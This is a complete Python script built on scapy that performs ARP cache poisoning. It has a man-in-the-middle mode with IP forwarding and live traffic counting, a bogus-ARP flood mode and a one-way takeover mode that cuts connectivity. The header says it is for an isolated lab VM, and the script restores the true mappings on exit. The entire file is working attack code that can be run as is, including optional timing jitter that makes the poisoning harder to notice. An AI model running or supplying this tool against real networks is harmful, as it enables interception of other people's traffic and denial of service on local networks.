#!/usr/bin/env python3
"""arp_lab.py — bidirectional ARP cache poisoning rig for an isolated lab bench.

Topology assumed by the defaults in the docs:

    attacker (this box)   10.0.2.15 / enp0s3
    gateway / router      10.0.2.1
    victim (Windows 11)   10.0.2.6

Run through, in order:

    1. resolve MACs for the gateway and the victim (ARP who-has)
    2. enable IPv4 forwarding so traffic keeps flowing (mitm/flood only)
    3. poison the caches:
         victim  -> "10.0.2.1 is at attacker_mac"
         gateway -> "10.0.2.6 is at attacker_mac"
    4. layer the mode-specific traffic on top of the poison
    5. count what crosses the wire while the link is hijacked
    6. on every exit path (Ctrl-C, SIGTERM, exception, --duration):
         replay the true mappings to both peers several times,
         then restore the original ip_forward value

Modes
    mitm      bidirectional poison + forwarding + live counters   (default)
    flood     ARP table overflow: hammer the victim with bogus
              gateway claims across the /24 to force cache thrash
    takeover  one-way poison + ARP reply storm, no forwarding —
              a connectivity-drop demo, cache claims only

Requires: root, scapy >= 2.5, writable /proc/sys/net/ipv4/ip_forward.

Run this in a VM. It rewrites layer-2 reachability for hosts that never
asked for it. Lab bench only.
"""

from __future__ import annotations

import argparse
import os
import random
import signal
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from typing import Callable, NoReturn, Optional

try:
    from scapy.all import (  # noqa: E402
        ARP,
        ICMP,
        IP,
        TCP,
        UDP,
        Ether,
        get_if_hwaddr,
        get_if_list,
        getmacbyip,
        sendp,
        sniff,
    )
except ImportError:  # pragma: no cover - import-time dependency gate
    sys.stderr.write(
        "[x] scapy is not installed. install it with:\n"
        "    python3 -m pip install 'scapy>=2.5'\n"
    )
    raise SystemExit(1)


# --------------------------------------------------------------------------
# tunables — one block, nothing scattered
# --------------------------------------------------------------------------
POISON_INTERVAL = 1.5      # seconds between re-poison rounds
POISON_BURST = 3           # replies per peer per round
FLOOD_HOSTS = 254          # bogus claims pushed at victim in flood mode
FLOOD_RATE = 60            # packets/second ceiling for flood mode
RESTORE_ROUNDS = 5         # correct-ARP replays on teardown
RESTORE_GAP = 0.3          # seconds between restore rounds
TEARDOWN_JOIN = 2.0        # max seconds to wait for a worker thread

MODES = ("mitm", "flood", "takeover")
IP_FORWARD = "/proc/sys/net/ipv4/ip_forward"


# --------------------------------------------------------------------------
# small helpers
# --------------------------------------------------------------------------
def die(msg: str) -> NoReturn:
    """Print a fatal error to stderr and exit non-zero."""
    print(f"[x] {msg}", file=sys.stderr)
    raise SystemExit(1)


def log(tag: str, msg: str) -> None:
    """Flush one log line with a millisecond timestamp."""
    stamp = time.strftime("%H:%M:%S")
    print(f"[{stamp}] [{tag}] {msg}", flush=True)


def sh(cmd: list[str]) -> str:
    """Run a command, return stripped stdout. Never raises on exit code."""
    return subprocess.run(cmd, capture_output=True, text=True).stdout.strip()


def iface_ip(iface: str) -> str:
    """Return the first IPv4 address bound to `iface`."""
    out = sh(["ip", "-4", "-o", "addr", "show", "dev", iface])
    if not out:
        die(f"no IPv4 address on {iface} — check `ip addr show {iface}`")
    return out.split()[3].split("/")[0]


def read_forward() -> int:
    """Read ip_forward, or -1 when the file cannot be read."""
    try:
        with open(IP_FORWARD) as fh:
            return int(fh.read().strip())
    except (OSError, ValueError):
        return -1


def write_forward(value: int) -> None:
    """Write ip_forward. Fails closed with a clear message."""
    try:
        with open(IP_FORWARD, "w") as fh:
            fh.write(str(value))
    except OSError as exc:
        die(f"cannot write {IP_FORWARD}: {exc} (are you root?)")


def is_ipv4(value: str) -> bool:
    """True when `value` is four dotted decimal octets, 0-255."""
    parts = value.split(".")
    if len(parts) != 4:
        return False
    try:
        return all(0 <= int(part) <= 255 for part in parts)
    except ValueError:
        return False


def resolve_mac(ip: str, iface: str, attempts: int = 3) -> str:
    """Resolve an IPv4 address to a MAC on the local segment."""
    for _ in range(attempts):
        mac = getmacbyip(ip)
        if mac:
            return mac
        sendp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
            iface=iface,
            verbose=0,
        )
        time.sleep(0.4)
    die(f"no ARP reply from {ip} — is it on the same L2 segment?")


# --------------------------------------------------------------------------
# counters
# --------------------------------------------------------------------------
@dataclass
class Counters:
    """Thread-safe packet/byte tally for the poisoned window."""

    total: int = 0
    tcp: int = 0
    udp: int = 0
    icmp: int = 0
    arp: int = 0
    ip: int = 0
    vbytes: int = 0
    first_seen: float = field(default_factory=time.time)
    per_peer: dict[str, int] = field(default_factory=dict)
    lock: threading.Lock = field(default_factory=threading.Lock)

    def add(self, pkt) -> None:
        """Account for one sniffed packet. Called from the sniffer thread."""
        with self.lock:
            self.total += 1
            self.vbytes += len(pkt)
            if ARP in pkt:
                self.arp += 1
                return
            if IP not in pkt:
                return
            self.ip += 1
            key = f"{pkt[IP].src}->{pkt[IP].dst}"
            self.per_peer[key] = self.per_peer.get(key, 0) + 1
            if TCP in pkt:
                self.tcp += 1
            elif UDP in pkt:
                self.udp += 1
            elif ICMP in pkt:
                self.icmp += 1

    def snapshot(self) -> dict:
        """Return a consistent copy of the tallies plus derived rates."""
        with self.lock:
            up = max(time.time() - self.first_seen, 1e-6)
            return {
                "packets": self.total,
                "ip": self.ip,
                "arp": self.arp,
                "tcp": self.tcp,
                "udp": self.udp,
                "icmp": self.icmp,
                "bytes": self.vbytes,
                "pps": round(self.total / up, 2),
                "kbps": round((self.vbytes * 8 / 1000) / up, 1),
                "top": sorted(
                    self.per_peer.items(), key=lambda kv: kv[1], reverse=True
                )[:5],
            }


# --------------------------------------------------------------------------
# the rig
# --------------------------------------------------------------------------
class ArpRig:
    """Owns the poison workers, the sniffer, the counters, and teardown."""

    def __init__(
        self,
        iface: str,
        victim: str,
        gateway: str,
        mode: str,
        spread: float,
        jitter: bool,
    ) -> None:
        self.iface = iface
        self.victim = victim
        self.gateway = gateway
        self.mode = mode
        self.spread = max(spread, 0.5)
        self.jitter = jitter

        self.my_ip = iface_ip(iface)
        self.my_mac = get_if_hwaddr(iface)
        self.victim_mac = resolve_mac(victim, iface)
        self.gateway_mac = resolve_mac(gateway, iface)
        self.orig_forward = read_forward()

        if self.victim_mac.lower() == self.gateway_mac.lower():
            die("victim and gateway resolve to the same MAC — bad targets?")

        self.counters = Counters()
        self._stop = threading.Event()
        self._threads: list[threading.Thread] = []
        self._poison_sent = 0
        self._stopped = False

    # -- packet builders ---------------------------------------------------
    def _reply(
        self, psrc: str, hwsrc: str, pdst: str, hwdst: str
    ) -> Ether:
        """Build a unicast ARP reply claiming psrc lives at hwsrc."""
        return Ether(dst=hwdst, src=hwsrc) / ARP(
            op=2, psrc=psrc, hwsrc=hwsrc, pdst=pdst, hwdst=hwdst
        )

    def _gratuitous(self, ip: str, hwsrc: str, hwdst: str) -> Ether:
        """Build an unsolicited reply, psrc == pdst == ip."""
        return Ether(dst=hwdst, src=hwsrc) / ARP(
            op=2, psrc=ip, hwsrc=hwsrc, pdst=ip, hwdst="ff:ff:ff:ff:ff:ff"
        )

    def poison_victim(self) -> Ether:
        """Victim learns: the gateway lives at the attacker MAC."""
        return self._reply(
            self.gateway, self.my_mac, self.victim, self.victim_mac
        )

    def poison_gateway(self) -> Ether:
        """Gateway learns: the victim lives at the attacker MAC."""
        return self._reply(
            self.victim, self.my_mac, self.gateway, self.gateway_mac
        )

    def poison_frames(self) -> list[Ether]:
        """Frames replayed each poison round, chosen by mode."""
        if self.mode == "takeover":
            # one-way: only the victim is lied to, in a gratuitous shout
            return [
                self._gratuitous(self.gateway, self.my_mac, self.victim_mac)
            ]
        return [self.poison_victim(), self.poison_gateway()]

    def restore_frames(self) -> list[Ether]:
        """Truthful mappings for both peers, sent on every teardown."""
        return [
            self._reply(
                self.gateway, self.gateway_mac, self.victim, self.victim_mac
            ),
            self._reply(
                self.victim, self.victim_mac, self.gateway, self.gateway_mac
            ),
        ]

    # -- workers -----------------------------------------------------------
    def _poison_loop(self) -> None:
        frames = self.poison_frames()
        churn = [
            (self.gateway, self.victim_mac),
            (self.victim, self.gateway_mac),
        ]
        while not self._stop.is_set():
            for frame in frames:
                for _ in range(POISON_BURST):
                    sendp(frame, iface=self.iface, verbose=0)
                    self._poison_sent += 1
            # forced cache churn: a gratuitous claim per side so dynamic
            # entries re-arm their timer instead of expiring back to truth
            if self.mode != "takeover":
                for ip, dst in churn:
                    sendp(
                        self._gratuitous(ip, self.my_mac, dst),
                        iface=self.iface,
                        verbose=0,
                    )
                    self._poison_sent += 1
            wait = POISON_INTERVAL
            if self.jitter:
                wait *= random.uniform(0.6, 1.4)
            self._stop.wait(wait)

    def _flood_loop(self) -> None:
        base = ".".join(self.gateway.split(".")[:3])
        while not self._stop.is_set():
            for host in range(1, FLOOD_HOSTS + 1):
                if self._stop.is_set():
                    break
                fake_mac = "02:00:%02x:%02x:%02x:%02x" % (
                    random.randrange(1, 255),
                    random.randrange(256),
                    random.randrange(256),
                    random.randrange(256),
                    random.randrange(256),
                )
                sendp(
                    self._reply(
                        f"{base}.{host}", fake_mac, self.victim,
                        self.victim_mac,
                    ),
                    iface=self.iface,
                    verbose=0,
                )
                self._poison_sent += 1
                self._stop.wait(1.0 / FLOOD_RATE)

    def _sniff_loop(self) -> None:
        try:
            sniff(
                iface=self.iface,
                prn=self.counters.add,
                store=False,
                stop_filter=lambda _pkt: self._stop.is_set(),
            )
        except Exception as exc:  # noqa: BLE001 - sniffer dies on teardown
            if not self._stop.is_set():
                log("!", f"sniffer stopped: {exc}")

    def _report_loop(self) -> None:
        while not self._stop.wait(self.spread):
            snap = self.counters.snapshot()
            top = ", ".join(f"{k} x{v}" for k, v in snap["top"]) or "idle"
            log(
                ">",
                f"poison={self._poison_sent} pkt={snap['packets']} "
                f"tcp={snap['tcp']} udp={snap['udp']} "
                f"icmp={snap['icmp']} arp={snap['arp']} "
                f"{snap['pps']}pps {snap['kbps']}kbps | {top}",
            )

    # -- lifecycle ---------------------------------------------------------
    def start(self) -> None:
        """Bring up the workers for the selected mode."""
        if self.mode in ("mitm", "flood"):
            write_forward(1)

        workers: dict[str, Callable[[], None]] = {
            "sniff": self._sniff_loop,
            "report": self._report_loop,
            "poison": self._poison_loop,
            "flood": self._flood_loop,
        }
        wanted = {
            "mitm": ("sniff", "report", "poison"),
            "flood": ("report", "flood"),
            "takeover": ("report", "poison"),
        }[self.mode]

        for name in wanted:
            thread = threading.Thread(
                target=workers[name], daemon=True, name=name
            )
            thread.start()
            self._threads.append(thread)

        log(
            "+",
            f"mode={self.mode} iface={self.iface} me={self.my_ip} "
            f"({self.my_mac}) victim={self.victim}({self.victim_mac}) "
            f"gw={self.gateway}({self.gateway_mac}) "
            f"forward={read_forward()}",
        )

    def stop(self) -> None:
        """Restore truthful ARP mappings, then the original ip_forward."""
        if self._stopped:
            return
        self._stopped = True
        self._stop.set()

        # restore before joining: peers must hear the truth while the
        # forward path is still up and the wire is still ours
        frames = self.restore_frames()
        for _ in range(RESTORE_ROUNDS):
            for frame in frames:
                sendp(frame, iface=self.iface, verbose=0)
            time.sleep(RESTORE_GAP)

        if self.orig_forward in (0, 1):
            write_forward(self.orig_forward)

        for thread in self._threads:
            thread.join(timeout=TEARDOWN_JOIN)

        snap = self.counters.snapshot()
        log(
            "=",
            f"teardown: restored {len(frames)}x{RESTORE_ROUNDS} "
            f"forward={read_forward()} total={snap['packets']} "
            f"bytes={snap['bytes']}",
        )


# --------------------------------------------------------------------------
# entry
# --------------------------------------------------------------------------
def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="arp_lab.py",
        description="ARP cache poisoning rig for an isolated lab bench.",
        epilog=(
            "example: sudo python3 arp_lab.py -i enp0s3 "
            "-v 10.0.2.6 -g 10.0.2.1 -m mitm --duration 60"
        ),
    )
    parser.add_argument("-i", "--iface", help="interface to poison on, e.g. enp0s3")
    parser.add_argument("-v", "--victim", help="victim IPv4, e.g. 10.0.2.6")
    parser.add_argument("-g", "--gateway", help="gateway IPv4, e.g. 10.0.2.1")
    parser.add_argument(
        "-m", "--mode", default="mitm", choices=MODES,
        help="operation mode (default: mitm)",
    )
    parser.add_argument(
        "-s", "--spread", type=float, default=5.0,
        help="seconds between counter reports (default: 5.0)",
    )
    parser.add_argument(
        "--jitter", action="store_true",
        help="randomize the poison interval by +/-40%%",
    )
    parser.add_argument(
        "--duration", type=float, default=0.0,
        help="auto-stop after N seconds (0 = run until interrupted)",
    )
    parser.add_argument(
        "--list-ifaces", action="store_true",
        help="print interfaces and exit",
    )
    return parser


def main() -> None:
    args = build_parser().parse_args()

    if args.list_ifaces:
        for name in get_if_list():
            addr = sh(["ip", "-4", "-o", "addr", "show", "dev", name])
            ip = addr.split()[3].split("/")[0] if addr else "-"
            print(f"{name}\t{ip}")
        return

    missing = [
        flag for flag, value in (
            ("--iface", args.iface),
            ("--victim", args.victim),
            ("--gateway", args.gateway),
        ) if not value
    ]
    if missing:
        die(f"missing required option(s): {', '.join(missing)}")

    for label, value in (("victim", args.victim), ("gateway", args.gateway)):
        if not is_ipv4(value):
            die(f"{label} is not a valid IPv4 address: {value}")

    if args.victim == args.gateway:
        die("victim and gateway cannot be the same address")

    if os.geteuid() != 0:
        die("needs root (raw sockets + ip_forward)")

    rig = ArpRig(
        args.iface, args.victim, args.gateway, args.mode, args.spread,
        args.jitter,
    )

    def _signal(_signum, _frame):
        raise KeyboardInterrupt

    signal.signal(signal.SIGTERM, _signal)
    signal.signal(signal.SIGINT, _signal)

    try:
        rig.start()
        if args.duration > 0:
            log("+", f"running for {args.duration:g}s")
            time.sleep(args.duration)
        else:
            log("+", "running until interrupted (Ctrl-C to stop)")
            while True:
                time.sleep(3600)
    except KeyboardInterrupt:
        log("+", "interrupt received — tearing down")
    finally:
        rig.stop()


if __name__ == "__main__":
    main()
